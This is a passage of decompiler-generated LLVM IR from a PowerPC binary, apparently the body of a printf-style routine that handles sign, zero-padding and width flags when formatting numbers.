  %storemerge95 = phi i32 [ %v4_1000ce5c, %dec_label_pc_1000ce5c ], [ 32, %dec_label_pc_1000ce4c ]
  store i32 %storemerge95, i32* @r26, align 4
  %v3_1000ce60 = icmp eq i32 %v0_1000ce1c, 1
  br i1 %v3_1000ce60, label %dec_label_pc_1000ce7c, label %dec_label_pc_1000ce6c

dec_label_pc_1000ce6c:                            ; preds = %dec_label_pc_1000ce60
  %v0_1000ce6c = load i32, i32* @r7, align 4
  %v1_1000ce6c = mul i32 %v0_1000ce6c, 4
  store i32 %v1_1000ce6c, i32* %r0.global-to-local, align 4
  %v0_1000ce70 = load i32, i32* @r1, align 4
  %v2_1000ce70 = add i32 %v0_1000ce70, %v1_1000ce6c
  %v1_1000ce74 = add i32 %v2_1000ce70, 188
  %v2_1000ce74 = inttoptr i32 %v1_1000ce74 to i32*
  %v3_1000ce74 = load i32, i32* %v2_1000ce74, align 4
  store i32 %v3_1000ce74, i32* %r0.global-to-local, align 4
  %v1_1000ce78 = call i32 @__asm_rlwinm(i32 %v3_1000ce74, i32 0, i32 20, i32 23)
  br label %dec_label_pc_1000ce7c

dec_label_pc_1000ce7c:                            ; preds = %dec_label_pc_1000ce60, %dec_label_pc_1000ce6c
  %v3_1000ce7c = load i32, i32* %stack_var_-344, align 4
  %v0_1000ce80 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000ce80, i32* @r5, align 4
  %v2_1000ce84 = inttoptr i32 %v0_1000ce80 to i32*
  %v3_1000ce84 = call i32 @function_10010b44(i32 %v3_1000ce7c, i32* %v2_1000ce84)
  %v0_1000ce94 = load i32, i32* %r31.global-to-local, align 4
  %v6_1000ce9c = call i32 @function_10010c00(i8* %v5_1000ce9c, i32 %v3_1000ce84, i32 %v3_1000ce7c, i32 %v0_1000ce80, i32 %v0_1000ce94)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_1000ce9c, i32* %r30.global-to-local, align 4
  br i1 %tmp75, label %dec_label_pc_1000cef0, label %dec_label_pc_1000ceb0

dec_label_pc_1000ceb0:                            ; preds = %dec_label_pc_1000ce7c
  %v7_1000ce9c = inttoptr i32 %v6_1000ce9c to i8*
  %v3_1000ceb0 = load i8, i8* %v7_1000ce9c, align 1
  %v4_1000ceb0 = zext i8 %v3_1000ceb0 to i32
  store i32 %v4_1000ceb0, i32* %r0.global-to-local, align 4
  %v3_1000ceb8 = icmp eq i8 %v3_1000ceb0, 45
  br i1 %v3_1000ceb8, label %dec_label_pc_1000cec0, label %dec_label_pc_1000ced4

dec_label_pc_1000cec0:                            ; preds = %dec_label_pc_1000ceb0
  %v1_1000cec0 = or i32 %v0_1000cee4, 2
  store i32 %v1_1000cec0, i32* %r0.global-to-local, align 4
  %v2_1000cec4 = add i32 %v6_1000ce9c, 1
  store i32 %v2_1000cec4, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_1000cef0

dec_label_pc_1000ced4:                            ; preds = %dec_label_pc_1000ceb0
  %v1_1000ced4 = and i32 %v0_1000cee4, 2
  store i32 %v1_1000ced4, i32* %r0.global-to-local, align 4
  %v3_1000ced4 = icmp eq i32 %v1_1000ced4, 0
  br i1 %v3_1000ced4, label %dec_label_pc_1000cee4, label %dec_label_pc_1000cedc

dec_label_pc_1000cedc:                            ; preds = %dec_label_pc_1000ced4
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000cef0

dec_label_pc_1000cee4:                            ; preds = %dec_label_pc_1000ced4
  %v1_1000cee4 = urem i32 %v0_1000cee4, 2
  store i32 %v1_1000cee4, i32* %r11.global-to-local, align 4
  %v3_1000cee4 = icmp eq i32 %v1_1000cee4, 0
  br i1 %v3_1000cee4, label %dec_label_pc_1000cef0, label %dec_label_pc_1000ceec

dec_label_pc_1000ceec:                            ; preds = %dec_label_pc_1000cee4
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_1000cef0

dec_label_pc_1000cef0:                            ; preds = %dec_label_pc_1000cee4, %dec_label_pc_1000ce7c, %dec_label_pc_1000cedc, %dec_label_pc_1000cec0, %dec_label_pc_1000ceec
  %v0_1000cf5c = phi i32 [ %v6_1000ce9c, %dec_label_pc_1000ce7c ], [ %v2_1000cec4, %dec_label_pc_1000cec0 ], [ %v6_1000ce9c, %dec_label_pc_1000cee4 ], [ %v6_1000ce9c, %dec_label_pc_1000ceec ], [ %v6_1000ce9c, %dec_label_pc_1000cedc ]
  %stack_var_-184.0 = phi i32 [ %v0_1000cee4, %dec_label_pc_1000ce7c ], [ %v1_1000cec0, %dec_label_pc_1000cec0 ], [ %v0_1000cee4, %dec_label_pc_1000cee4 ], [ %v0_1000cee4, %dec_label_pc_1000ceec ], [ %v0_1000cee4, %dec_label_pc_1000cedc ]
  %v3_1000cef0 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_1000d104, i32* %r0.global-to-local, align 4
  %v2_1000cef8 = sub i32 %v2_1000d104, %v0_1000cf5c
  %v1_1000cefc = add i32 %v2_1000cef8, 127
  store i32 %v1_1000cefc, i32* %r31.global-to-local, align 4
  %tmp77 = icmp sgt i32 %v3_1000cef0, -1
  br i1 %tmp77, label %dec_label_pc_1000cf0c, label %dec_label_pc_1000cf08

dec_label_pc_1000cf08:                            ; preds = %dec_label_pc_1000cef0
  br label %dec_label_pc_1000cf0c

dec_label_pc_1000cf0c:                            ; preds = %dec_label_pc_1000cef0, %dec_label_pc_1000cf08
  %v0_1000cf40 = phi i32 [ %v3_1000cef0, %dec_label_pc_1000cef0 ], [ 1, %dec_label_pc_1000cf08 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1000cf10 = and i32 %stack_var_-184.0, 16
  store i32 %v1_1000cf10, i32* %r11.global-to-local, align 4
  %v3_1000cf10 = icmp eq i32 %v1_1000cf10, 0
  br i1 %v3_1000cf10, label %dec_label_pc_1000cf5c, label %dec_label_pc_1000cf18

dec_label_pc_1000cf18:                            ; preds = %dec_label_pc_1000cf0c
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_1000cf1c, label %dec_label_pc_1000cf28, label %dec_label_pc_1000cf38.thread

dec_label_pc_1000cf38.thread:                     ; preds = %dec_label_pc_1000cf18
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_1000cf5c

dec_label_pc_1000cf28:                            ; preds = %dec_label_pc_1000cf18
  br i1 %v3_1000cf28, label %dec_label_pc_1000cf30, label %dec_label_pc_1000cf38

dec_label_pc_1000cf30:                            ; preds = %dec_label_pc_1000cf28
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_1000cf5c

dec_label_pc_1000cf38:                            ; preds = %dec_label_pc_1000cf28
  br i1 %v3_1000cf38, label %dec_label_pc_1000cf40, label %dec_label_pc_1000cf5c

dec_label_pc_1000cf40:                            ; preds = %dec_label_pc_1000cf38
  %v3_1000cf40 = icmp ugt i32 %v0_1000cf40, %v1_1000cefc
  br i1 %v3_1000cf40, label %dec_label_pc_1000cf5c, label %dec_label_pc_1000cf48

dec_label_pc_1000cf48:                            ; preds = %dec_label_pc_1000cf40
  %v1_1000cf48 = inttoptr i32 %v0_1000cf5c to i8*
  %v2_1000cf48 = load i8, i8* %v1_1000cf48, align 1
  %v3_1000cf48 = zext i8 %v2_1000cf48 to i32
  store i32 %v3_1000cf48, i32* %r0.global-to-local, align 4
  %v3_1000cf50 = icmp eq i8 %v2_1000cf48, 48
  br i1 %v3_1000cf50, label %dec_label_pc_1000cf5c, label %dec_label_pc_1000cf58

dec_label_pc_1000cf58:                            ; preds = %dec_label_pc_1000cf48
  %v1_1000cf58 = add i32 %v2_1000cef8, 128
  br label %dec_label_pc_1000cf5c

dec_label_pc_1000cf5c:                            ; preds = %dec_label_pc_1000cf38.thread, %dec_label_pc_1000cf38, %dec_label_pc_1000cf48, %dec_label_pc_1000cf40, %dec_label_pc_1000cf0c, %dec_label_pc_1000cf30, %dec_label_pc_1000cf58
  %v1_1000cfa4 = phi i32 [ %v0_1000cf40, %dec_label_pc_1000cf38 ], [ 1, %dec_label_pc_1000cf48 ], [ %v0_1000cf40, %dec_label_pc_1000cf40 ], [ %v0_1000cf40, %dec_label_pc_1000cf0c ], [ %v0_1000cf40, %dec_label_pc_1000cf30 ], [ %v1_1000cf58, %dec_label_pc_1000cf58 ], [ %v0_1000cf40, %dec_label_pc_1000cf38.thread ]
  %v1_1000cf5c = inttoptr i32 %v0_1000cf5c to i8*
  %v2_1000cf5c = load i8, i8* %v1_1000cf5c, align 1
  %v3_1000cf5c = zext i8 %v2_1000cf5c to i32
  store i32 %v3_1000cf5c, i32* %r0.global-to-local, align 4
  %v3_1000cf60 = icmp eq i8 %v2_1000cf5c, 48
  br i1 %v3_1000cf60, label %dec_label_pc_1000cf68, label %dec_label_pc_1000cfa0

dec_label_pc_1000cf68:                            ; preds = %dec_label_pc_1000cf5c
  %v0_1000cf68 = load i32, i32* @r27, align 4
  %tmp78 = icmp slt i32 %v0_1000cf68, 6
  br i1 %tmp78, label %dec_label_pc_1000cf74, label %dec_label_pc_1000cf70

dec_label_pc_1000cf70:                            ; preds = %dec_label_pc_1000cf68
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1000cf74

dec_label_pc_1000cf74:                            ; preds = %dec_label_pc_1000cf68, %dec_label_pc_1000cf70
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_1000cf78, label %dec_label_pc_1000cf80, label %dec_label_pc_1000cf90

dec_label_pc_1000cf80:                            ; preds = %dec_label_pc_1000cf74
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10019474.716 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d11c

dec_label_pc_1000cf90:                            ; preds = %dec_label_pc_1000cf74
  %v3_1000cf90 = icmp eq i32 %v1_1000cfa4, 0
  br i1 %v3_1000cf90, label %dec_label_pc_1000cf98, label %dec_label_pc_1000cfa0

dec_label_pc_1000cf98:                            ; preds = %dec_label_pc_1000cf90
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d11c

dec_label_pc_1000cfa0:                            ; preds = %dec_label_pc_1000cf90, %dec_label_pc_1000cf5c
  %v3_1000cfa0 = icmp ugt i32 %v1_1000cfa4, %v1_1000cefc
  %v2_1000cfa4 = sub i32 %v1_1000cfa4, %v1_1000cefc
  store i32 %v2_1000cfa4, i32* %r29.global-to-local, align 4
  br i1 %v3_1000cfa0, label %dec_label_pc_1000d13cthread-pre-split, label %dec_label_pc_1000d11c

dec_label_pc_1000cfb0:                            ; preds = %dec_label_pc_1000cdd4
  br i1 %v2_1000cfb0, label %dec_label_pc_1000cfe4, label %dec_label_pc_1000cfb8

dec_label_pc_1000cfb8:                            ; preds = %dec_label_pc_1000cfb0
  %v3_1000cfb8 = load i32, i32* %stack_var_-344, align 4
  %v0_1000cfc4 = load i32, i32* %r24.global-to-local, align 4
  store i32 268488660, i32* @lr, align 4
  %v5_1000cfd0 = call i32 @function_10010cfc(i32 %v0_1000cfc4, i32* nonnull %stack_var_-196, i32 268487604, i32 %v3_1000cfb8)
  %v1_1000cfd4 = icmp slt i32 %v5_1000cfd0, 0
  br i1 %v1_1000cfd4, label %dec_label_pc_1000d2a0, label %dec_label_pc_1000cfdc

dec_label_pc_1000cfdc:                            ; preds = %dec_label_pc_1000cfb8
  %v0_1000cfdc = load i32, i32* %r23.global-to-local, align 4
  %v2_1000cfdc = add i32 %v0_1000cfdc, %v5_1000cfd0
  store i32 %v2_1000cfdc, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000d28c

dec_label_pc_1000cfe4:                            ; preds = %dec_label_pc_1000cfb0
  br i1 %v2_1000cfe4, label %dec_label_pc_1000d08c, label %dec_label_pc_1000cfec

dec_label_pc_1000cfec:                            ; preds = %dec_label_pc_1000cfe4
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_1000cff8 = load i32, i32* %stack_var_-344, align 4
  %v1_1000d000 = inttoptr i32 %v3_1000cff8 to i32*
  %v2_1000d000 = load i32, i32* %v1_1000d000, align 4
  br i1 %v3_1000cfe4, label %dec_label_pc_1000d000, label %dec_label_pc_1000d054

dec_label_pc_1000d000:                            ; preds = %dec_label_pc_1000cfec
  store i32 %v2_1000d000, i32* %r0.global-to-local, align 4
  %v3_1000d004 = icmp eq i32 %v2_1000d000, 0
  store i32 %v2_1000d000, i32* %stack_var_-340, align 4
  br i1 %v3_1000d004, label %dec_label_pc_1000d124, label %dec_label_pc_1000d010

dec_label_pc_1000d010:                            ; preds = %dec_label_pc_1000d000
  %v3_1000d010 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000d010, i32* %r0.global-to-local, align 4
  %v1_1000d018 = icmp slt i32 %v3_1000d010, 0
  br i1 %v1_1000d018, label %dec_label_pc_1000d024, label %dec_label_pc_1000d020

dec_label_pc_1000d020:                            ; preds = %dec_label_pc_1000d010
  br label %dec_label_pc_1000d024

dec_label_pc_1000d024:                            ; preds = %dec_label_pc_1000d010, %dec_label_pc_1000d020
  %storemerge97 = phi i32 [ %v3_1000d010, %dec_label_pc_1000d020 ], [ -1, %dec_label_pc_1000d010 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 %v2_1000d024, i32* @r3, align 4
  store i32 %v2_1000d028, i32* @r6, align 4
  store i32 %v2_1000d024, i32* @r4, align 4
  store i32 268488756, i32* @lr, align 4
  %v0_1000d030 = call i32 @function_100106a4()
  %v3_1000d034 = icmp eq i32 %v0_1000d030, -1
  store i32 %v0_1000d030, i32* @r31, align 4
  br i1 %v3_1000d034, label %dec_label_pc_1000d2a0, label %dec_label_pc_1000d040

dec_label_pc_1000d040:                            ; preds = %dec_label_pc_1000d024
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d13c

dec_label_pc_1000d054:                            ; preds = %dec_label_pc_1000cfec
  store i32 %v2_1000d104, i32* @r28, align 4
  store i32 268488808, i32* @lr, align 4
  %v3_1000d064 = call i32 @function_10010648(i32 %v2_1000d104, i32 %v2_1000d000, i32 %v2_1000d028)
  %v3_1000d068 = icmp eq i32 %v3_1000d064, -1
  store i32 %v3_1000d064, i32* @r31, align 4
  br i1 %v3_1000d068, label %dec_label_pc_1000d2a0, label %dec_label_pc_1000d074

dec_label_pc_1000d074:                            ; preds = %dec_label_pc_1000d054
  store i32 %v2_1000d104, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_1000d084 = load i32, i32* @r25, align 4
  %v1_1000d084 = load i32, i32* @r28, align 4
  %v3_1000d084 = trunc i32 %v0_1000d084 to i8
  %v4_1000d084 = add i32 %v1_1000d084, %v3_1000d064
  %v5_1000d084 = inttoptr i32 %v4_1000d084 to i8*
  store i8 %v3_1000d084, i8* %v5_1000d084, align 1
  %v0_1000d140.pre.pre = load i32, i32* @r31, align 4
  %v1_1000d140.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000d13cthread-pre-split

dec_label_pc_1000d08c:                            ; preds = %dec_label_pc_1000cfe4
  br i1 %v2_1000d08c, label %dec_label_pc_1000d0f8, label %dec_label_pc_1000d094

dec_label_pc_1000d094:                            ; preds = %dec_label_pc_1000d08c
  %v3_1000d098 = load i32, i32* %stack_var_-344, align 4
  %v1_1000d0a0 = inttoptr i32 %v3_1000d098 to i32*
  %v2_1000d0a0 = load i32, i32* %v1_1000d0a0, align 4
  br i1 %v3_1000d08c, label %dec_label_pc_1000d0a0, label %dec_label_pc_1000d0d0

dec_label_pc_1000d0a0:                            ; preds = %dec_label_pc_1000d094
  store i32 %v2_1000d0a0, i32* %r30.global-to-local, align 4
  %v3_1000d0a4 = icmp eq i32 %v2_1000d0a0, 0
  br i1 %v3_1000d0a4, label %dec_label_pc_1000d124, label %dec_label_pc_1000d0ac

dec_label_pc_1000d0ac:                            ; preds = %dec_label_pc_1000d0a0, %dec_label_pc_1000d100
  %v0_1000d0c0 = phi i32 [ %v2_1000d0a0, %dec_label_pc_1000d0a0 ], [ %v3_1000d110, %dec_label_pc_1000d100 ]
  %v3_1000d0ac = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000d0ac, i32* %r0.global-to-local, align 4
  %v1_1000d0b4 = icmp slt i32 %v3_1000d0ac, 0
  br i1 %v1_1000d0b4, label %dec_label_pc_1000d0c0, label %dec_label_pc_1000d0bc

dec_label_pc_1000d0bc:                            ; preds = %dec_label_pc_1000d0ac
  br label %dec_label_pc_1000d0c0

dec_label_pc_1000d0c0:                            ; preds = %dec_label_pc_1000d0ac, %dec_label_pc_1000d0bc
  %storemerge98 = phi i32 [ %v3_1000d0ac, %dec_label_pc_1000d0bc ], [ -1, %dec_label_pc_1000d0ac ]
  store i32 %storemerge98, i32* @r4, align 4
  store i32 268488904, i32* @lr, align 4
  %v1_1000d0c4 = inttoptr i32 %v0_1000d0c0 to i8*
  %v2_1000d0c4 = call i32 @function_1000e0c0(i8* %v1_1000d0c4)
  store i32 %v2_1000d0c4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d130

dec_label_pc_1000d0d0:                            ; preds = %dec_label_pc_1000d094
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 %v2_1000d104, i32* %r30.global-to-local, align 4
  store i32 %v2_1000d0a0, i32* %stack_var_-328, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d13cthread-pre-split

dec_label_pc_1000d0f8:                            ; preds = %dec_label_pc_1000d08c
  br i1 %v3_1000d0f8, label %dec_label_pc_1000d100, label %dec_label_pc_1000d2a0

dec_label_pc_1000d100:                            ; preds = %dec_label_pc_1000d0f8
  %v0_1000d100 = call i32 @function_1000c85c()
  %v1_1000d108 = inttoptr i32 %v0_1000d100 to i32*
  %v2_1000d108 = load i32, i32* %v1_1000d108, align 4
  store i32 %v2_1000d108, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268488980, i32* @lr, align 4
  %v3_1000d110 = call i32 @function_1000e2a4(i32 %v2_1000d108, i32 %v2_1000d104, i32 128)
  store i32 %v3_1000d110, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d0ac

dec_label_pc_1000d11c:                            ; preds = %dec_label_pc_1000cfa0, %dec_label_pc_1000cf98, %dec_label_pc_1000cf80
  %v0_1000d140.pre41 = phi i32 [ %v1_1000cefc, %dec_label_pc_1000cfa0 ], [ 0, %dec_label_pc_1000cf98 ], [ 5, %dec_label_pc_1000cf80 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000d13cthread-pre-split

dec_label_pc_1000d124:                            ; preds = %dec_label_pc_1000d0a0, %dec_label_pc_1000d000
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001947c.717 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d130

dec_label_pc_1000d130:                            ; preds = %dec_label_pc_1000d0c0, %dec_label_pc_1000d124
  %v0_1000d14029 = phi i32 [ %v2_1000d0c4, %dec_label_pc_1000d0c0 ], [ 6, %dec_label_pc_1000d124 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_1000d13c

dec_label_pc_1000d13cthread-pre-split:            ; preds = %dec_label_pc_1000d074, %dec_label_pc_1000d0d0, %dec_label_pc_1000d11c, %dec_label_pc_1000cfa0
  %v1_1000d140.pre = phi i32 [ %v2_1000cfa4, %dec_label_pc_1000cfa0 ], [ 0, %dec_label_pc_1000d11c ], [ %v1_1000d140.pre.pre, %dec_label_pc_1000d074 ], [ 0, %dec_label_pc_1000d0d0 ]
  %v0_1000d140.pre = phi i32 [ %v1_1000cefc, %dec_label_pc_1000cfa0 ], [ %v0_1000d140.pre41, %dec_label_pc_1000d11c ], [ %v0_1000d140.pre.pre, %dec_label_pc_1000d074 ], [ 1, %dec_label_pc_1000d0d0 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_1000cfa0 ], [ %stack_var_-184.0, %dec_label_pc_1000d11c ], [ %v0_1000cee4, %dec_label_pc_1000d074 ], [ %v0_1000cee4, %dec_label_pc_1000d0d0 ]
  %v0_1000d13c.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000d13c

dec_label_pc_1000d13c:                            ; preds = %dec_label_pc_1000d13cthread-pre-split, %dec_label_pc_1000d040, %dec_label_pc_1000d130
  %v1_1000d140 = phi i32 [ %v1_1000d140.pre, %dec_label_pc_1000d13cthread-pre-split ], [ 0, %dec_label_pc_1000d040 ], [ 0, %dec_label_pc_1000d130 ]
  %v0_1000d140 = phi i32 [ %v0_1000d140.pre, %dec_label_pc_1000d13cthread-pre-split ], [ %v0_1000d030, %dec_label_pc_1000d040 ], [ %v0_1000d14029, %dec_label_pc_1000d130 ]
  %v0_1000d148 = phi i32 [ %v0_1000d13c.pr, %dec_label_pc_1000d13cthread-pre-split ], [ 11, %dec_label_pc_1000d040 ], [ 11, %dec_label_pc_1000d130 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_1000d13cthread-pre-split ], [ %v0_1000cee4, %dec_label_pc_1000d040 ], [ %v0_1000cee4, %dec_label_pc_1000d130 ]
  %v3_1000d13c = icmp eq i32 %v0_1000d148, 11
  %v2_1000d140 = add i32 %v0_1000d140, %v1_1000d140
  store i32 %v2_1000d140, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d13c, label %dec_label_pc_1000d15c, label %dec_label_pc_1000d148

dec_label_pc_1000d148:                            ; preds = %dec_label_pc_1000d13c
  %v0_1000d14c = call i32 @__asm_mfcr()
  %v1_1000d150 = call i32 @__asm_rlwinm(i32 %v0_1000d14c, i32 30, i32 31, i32 31)
  %v1_1000d154 = add i32 %v1_1000d150, 1
  %v0_1000d158 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d158 = add i32 %v0_1000d158, %v1_1000d154
  store i32 %v2_1000d158, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d15c

dec_label_pc_1000d15c:                            ; preds = %dec_label_pc_1000d13c, %dec_label_pc_1000d148
  %v0_1000d174 = phi i32 [ %v2_1000d140, %dec_label_pc_1000d13c ], [ %v2_1000d158, %dec_label_pc_1000d148 ]
  %v3_1000d164 = icmp ugt i32 %tmp, %v0_1000d174
  br i1 %v3_1000d164, label %dec_label_pc_1000d16c, label %dec_label_pc_1000d170

dec_label_pc_1000d16c:                            ; preds = %dec_label_pc_1000d15c
  %v2_1000d16c = sub i32 %tmp, %v0_1000d174
  br label %dec_label_pc_1000d170

dec_label_pc_1000d170:                            ; preds = %dec_label_pc_1000d15c, %dec_label_pc_1000d16c
  %storemerge96 = phi i32 [ %v2_1000d16c, %dec_label_pc_1000d16c ], [ 0, %dec_label_pc_1000d15c ]
  %v1_1000d180 = phi i32 [ %v2_1000d16c, %dec_label_pc_1000d16c ], [ 0, %dec_label_pc_1000d15c ]
  store i32 %storemerge96, i32* @r28, align 4
  %v0_1000d170 = load i32, i32* @r26, align 4
  %v3_1000d170 = icmp eq i32 %v0_1000d170, 48
  %v2_1000d174 = add i32 %v1_1000d180, %v0_1000d174
  store i32 %v2_1000d174, i32* %r0.global-to-local, align 4
  %v0_1000d178 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000d178 = add i32 %v0_1000d178, %v2_1000d174
  store i32 %v2_1000d178, i32* %r23.global-to-local, align 4
  br i1 %v3_1000d170, label %dec_label_pc_1000d180, label %dec_label_pc_1000d188

dec_label_pc_1000d180:                            ; preds = %dec_label_pc_1000d170
  %v0_1000d180 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d180 = add i32 %v0_1000d180, %v1_1000d180
  store i32 %v2_1000d180, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000d188

dec_label_pc_1000d188:                            ; preds = %dec_label_pc_1000d170, %dec_label_pc_1000d180
  %v0_1000d19c = phi i32 [ %v1_1000d180, %dec_label_pc_1000d170 ], [ 0, %dec_label_pc_1000d180 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_1000d18c = and i32 %stack_var_-184.1, 8
  %v3_1000d18c = icmp eq i32 %v1_1000d18c, 0
  br i1 %v3_1000d18c, label %dec_label_pc_1000d194, label %dec_label_pc_1000d1b0

dec_label_pc_1000d194:                            ; preds = %dec_label_pc_1000d188
  %v0_1000d194 = load i32, i32* %r24.global-to-local, align 4
  store i32 268489124, i32* @lr, align 4
  %v4_1000d1a0 = call i32 @function_1000cb54(i32 %v0_1000d194, i8 32, i32 %v0_1000d19c)
  %v1_1000d1a4 = load i32, i32* @r28, align 4
  %v4_1000d1a4 = icmp eq i32 %v4_1000d1a0, %v1_1000d1a4
  br i1 %v4_1000d1a4, label %dec_label_pc_1000d1ac, label %dec_label_pc_1000d2a0

dec_label_pc_1000d1ac:                            ; preds = %dec_label_pc_1000d194
  br label %dec_label_pc_1000d1b0

dec_label_pc_1000d1b0:                            ; preds = %dec_label_pc_1000d188, %dec_label_pc_1000d1ac
  %v0_1000d1b4 = load i32, i32* %r24.global-to-local, align 4
  %v0_1000d1bc = load i32, i32* @r27, align 4
  %v2_1000d1bc = add i32 %v0_1000d1bc, ptrtoint (i32* @global_var_10019484.718 to i32)
  store i32 268489156, i32* @lr, align 4
  %v2_1000d1c0 = call i32 @function_1000db9c(i32 %v2_1000d1bc, i32 %v0_1000d1b4)
  %v0_1000d1cc = load i32, i32* @r29, align 4
  store i32 268489172, i32* @lr, align 4
  %v4_1000d1d0 = call i32 @function_1000cb54(i32 %v0_1000d1b4, i8 48, i32 %v0_1000d1cc)
  %v1_1000d1d4 = load i32, i32* @r29, align 4
  %v4_1000d1d4 = icmp eq i32 %v4_1000d1d0, %v1_1000d1d4
  br i1 %v4_1000d1d4, label %dec_label_pc_1000d1dc, label %dec_label_pc_1000d2a0

dec_label_pc_1000d1dc:                            ; preds = %dec_label_pc_1000d1b0
  %v3_1000d1dc = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1000d1dc, i32* %r0.global-to-local, align 4
  %v3_1000d1e0 = icmp eq i32 %v3_1000d1dc, 0
  br i1 %v3_1000d1e0, label %dec_label_pc_1000d1e8, label %dec_label_pc_1000d210

dec_label_pc_1000d1e8:                            ; preds = %dec_label_pc_1000d1dc
  %v0_1000d1e8 = load i32, i32* @r31, align 4
  %v3_1000d1e8 = icmp eq i32 %v0_1000d1e8, 0
  br i1 %v3_1000d1e8, label %dec_label_pc_1000d204.thread, label %dec_label_pc_1000d204

dec_label_pc_1000d204.thread:                     ; preds = %dec_label_pc_1000d1e8
  br label %dec_label_pc_1000d274

dec_label_pc_1000d204:                            ; preds = %dec_label_pc_1000d1e8
  %v0_1000d1f4 = load i32, i32* @r30, align 4
  %v0_1000d1fc = load i32, i32* %r24.global-to-local, align 4
  store i32 268489220, i32* @lr, align 4
  %v4_1000d200 = inttoptr i32 %v0_1000d1fc to i16*
  %v5_1000d200 = call i32 @function_100108e0(i32 %v0_1000d1f4, i32 %v0_1000d1e8, i16* %v4_1000d200)
  %v1_1000d204.pre = load i32, i32* @r31, align 4
  %v4_1000d204 = icmp eq i32 %v5_1000d200, %v1_1000d204.pre
  br i1 %v4_1000d204, label %dec_label_pc_1000d274, label %dec_label_pc_1000d2a0

dec_label_pc_1000d210:                            ; preds = %dec_label_pc_1000d1dc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1000d258.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d258

dec_label_pc_1000d21c:                            ; preds = %dec_label_pc_1000d258
  %v2_1000d26c = icmp ugt i32 %v0_1000d21c, 128
  %v0_1000d21c. = select i1 %v2_1000d26c, i32 128, i32 %v0_1000d21c
  store i32 %v0_1000d21c., i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000d22c.719 to i32), i32* @lr, align 4
  %v0_1000d228 = call i32 @function_100106a4()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d228, i32* @r30, align 4
  %v3_1000d230 = icmp eq i32 %v0_1000d228, 0
  br i1 %v3_1000d230, label %dec_label_pc_1000d24c, label %dec_label_pc_1000d244

dec_label_pc_1000d244:                            ; preds = %dec_label_pc_1000d21c
  %v0_1000d234 = load i32, i32* %r24.global-to-local, align 4
  store i32 268489288, i32* @lr, align 4
  %v3_1000d244 = inttoptr i32 %v0_1000d234 to i16*
  %v4_1000d244 = call i32 @function_100108e0(i32 %v2_1000d104, i32 %v0_1000d228, i16* %v3_1000d244)
  store i32 %v4_1000d244, i32* %r0.global-to-local, align 4
  %v1_1000d24c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d24c

dec_label_pc_1000d24c:                            ; preds = %dec_label_pc_1000d21c, %dec_label_pc_1000d244
  %v1_1000d24c = phi i32 [ 0, %dec_label_pc_1000d21c ], [ %v1_1000d24c.pre, %dec_label_pc_1000d244 ]
  %v0_1000d250 = phi i32 [ 0, %dec_label_pc_1000d21c ], [ %v4_1000d244, %dec_label_pc_1000d244 ]
  %v4_1000d24c = icmp eq i32 %v0_1000d250, %v1_1000d24c
  %v1_1000d250 = load i32, i32* @r31, align 4
  %v2_1000d250 = sub i32 %v1_1000d250, %v0_1000d250
